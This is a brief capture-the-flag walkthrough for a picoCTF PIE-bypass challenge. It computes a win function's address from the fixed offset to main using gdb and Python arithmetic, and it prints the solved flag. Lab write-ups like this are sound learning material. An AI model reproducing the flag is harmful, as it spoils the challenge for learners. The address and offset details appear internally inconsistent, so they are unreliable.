# PIE-TIME  - PIE Exploitation (Easy)

---

## Overview 
- **Challange Type**: PIE Bypass
- **Difficulty**: Easy

## Approach

### Step1: Run the following command and view the results
- **gdb vuln**
- **info functions**

### Step2: Finding the offset
- PIE enables the generation of new random memory addresses after each runtime.
- But the offsets betweeen each address remains the same
- Copy the addresses of the main and win respectively (0x00000000000012a7, 0x000000000000133d)

### Step3: Determine the value of the offset
- **python-3 -c "print(hex(0x00000000000012a7 - 0x000000000000133d))"**

### Step4: Get win address by using obtained offset with the main address
- **python-3 -c "print(hex(0x608f5844433d - 0x96))"**

### Step5: Enter the result as the win function and get a flag like this
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}

Don't paste this flag.
